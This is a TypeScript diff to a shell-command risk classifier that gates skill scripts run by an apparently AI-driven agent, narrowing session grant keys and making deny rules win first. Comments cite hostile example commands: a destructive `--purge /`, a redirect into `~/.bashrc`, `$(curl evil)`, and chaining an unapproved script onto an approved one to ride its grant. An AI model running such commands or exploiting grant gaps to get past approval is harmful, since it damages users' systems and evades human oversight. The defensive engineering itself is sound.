@@ -321,27 +321,61 @@ function assetReason(a: SkillAssetContext): string {
   return `${what} — never reviewed here`
 }
 
+/**
+ * The session grant key for a segment that runs a skill script.
+ *
+ * TWO digests, not one. The content hash kills the grant the instant the bytes change —
+ * including mid-session after a HiveMind pull. The segment digest scopes it to this exact
+ * command line, so approving `sh collect.sh` grants nothing to `sh collect.sh --purge /`,
+ * `sh collect.sh > ~/.bashrc`, or `sh collect.sh $(curl evil)`. That matters more than it looks:
+ * the asset verdict REPLACES the ordinary classification for its segment, so whatever the
+ * classifier would have said about those extra tokens never runs either.
+ *
+ * A key at all, rather than `null`: re-prompting on every iteration of a loop that calls the
+ * same script ten times trains exactly the click-through reflex this gate exists to prevent.
+ * An identical command re-issued still rides the grant; anything else re-prompts.
+ *
+ * DEVIATION from the plan's Global Constraints, which state the format as
+ * `skill-asset:${hash.slice(0, 16)}` (the script alone). A human decided to narrow it after
+ * final review found the hash-only key covered arbitrary arguments and redirections.
+ */
+function assetGrantKey(asset: SkillAssetContext): string {
+  return `skill-asset:${asset.hash.slice(0, 16)}:${asset.segmentKey.slice(0, 16)}`
+}
+
+/**
+ * Classify one segment, with the skill-asset gate layered over the ordinary classification.
+ *
+ * Order matters, and it is deny-first. The gate scans EVERY token in the segment, so a segment
+ * that both leaves the sandbox and mentions a skill script — `cd /outside <skill script>` — used
+ * to come back as a HIGH ask because the gate returned before the `cd` deny was ever reached.
+ * More generally: any deny rule added to `classifyPlainSegment` below would be silently
+ * unreachable for asset-bearing segments. A gate that can WEAKEN an existing deny is pointed the
+ * wrong way, so the base classification runs first and a deny wins outright.
+ *
+ * Running the base path always is free — it is string-only, no filesystem, no database — and it
+ * runs before `ctx.skillAsset`, so a denied segment does not pay for the gate's syscalls at all.
+ */
 function classifySegment(segment: string, ctx: RiskContext): RiskVerdict {
-  // The skill-asset gate runs before the program-name dispatch: what matters is the FILE a
-  // segment executes, not whether the program is `bash`, `sh`, `python`, or the script itself.
-  // A gate, not a sandbox (spec §7.4) — see `skillAssetContextForSegment` for what it cannot see:
-  // `bash "$(cat target)"`, a script piped to an interpreter's stdin, and a dynamically built
-  // path are all out of reach and fall back to ordinary shell classification below.
+  const base = classifyPlainSegment(segment, ctx)
+  if (base.action === 'deny') return base
+  // The gate sits above the program-name dispatch: what matters is the FILE a segment executes,
+  // not whether the program is `bash`, `sh`, `python`, or the script itself. A gate, not a
+  // sandbox (spec §7.4) — see `skillAssetContextForSegment` for the full list of what it cannot
+  // see (command substitution, stdin-fed interpreters, `sh -c "…"`, paths containing a space);
+  // all of those fall back to the ordinary classification computed above.
   const asset = ctx.skillAsset?.(segment)
-  if (asset) {
-    return {
-      action: 'ask',
-      risk: 'HIGH',
-      // The content hash, deliberately not null: the body is a stable, named, previously
-      // reviewed file, so a session grant is reasonable — and pinning the key to the hash kills
-      // that grant the instant the bytes change, including mid-session after a HiveMind pull.
-      // `null` would re-prompt on every iteration of a loop that calls the script ten times,
-      // training exactly the click-through reflex this gate exists to prevent.
-      grantKey: `skill-asset:${asset.hash.slice(0, 16)}`,
-      reason: assetReason(asset),
-      assetContext: asset
-    }
+  if (!asset) return base
+  return {
+    action: 'ask',
+    risk: 'HIGH',
+    grantKey: assetGrantKey(asset),
+    reason: assetReason(asset),
+    assetContext: asset
   }
+}
+
+function classifyPlainSegment(segment: string, ctx: RiskContext): RiskVerdict {
   const tokens = shellSegmentTokens(segment)
   if (tokens.length === 0) return { action: 'allow', risk: 'LOW' }
   const prog = path.basename(tokens[0])
@@ -449,10 +483,34 @@ export function classifyToolCall(
     const command = String(input[tax.commandField] ?? '')
     const segments = command.split(/&&|\|\||;|\|/)
     let worst: RiskVerdict = { action: 'allow', risk: 'LOW' }
+    // Every DISTINCT script the command runs, in order. The merge keeps one winning verdict, so
+    // without this a two-script command would be gated, keyed and displayed as if it ran only
+    // the first — and `sh <approved>/run.sh && sh <evil>/run.sh` would ride the grant earned on
+    // `sh <approved>/run.sh` alone, executing the second script with no card at all.
+    const assets: SkillAssetContext[] = []
     for (const seg of segments) {
       const v = classifySegment(seg, ctx)
       if (v.action === 'deny') return v
+      if (
+        v.action === 'ask' &&
+        v.assetContext &&
+        !assets.some((a) => a.hash === v.assetContext!.hash)
+      )
+        assets.push(v.assetContext)
       if (isWorse(v, worst)) worst = v
+    }
+    if (assets.length > 1 && worst.action === 'ask') {
+      // `grantKey: null` is the load-bearing half — it is what removes the silent-execution
+      // path. The card still shows the first script's bytes (`assetContext` is unchanged) and
+      // its `argsPreview` shows the whole command, so the reviewer can see the others named;
+      // the reason names them too, for the audit trail.
+      return {
+        ...worst,
+        grantKey: null,
+        reason: `${assets.length} different skill scripts in one command (${assets
+          .map((a) => `${a.skill}/${a.relPath}`)
+          .join(', ')}) — only the first is shown; no session grant`
+      }
     }
     return worst
   }
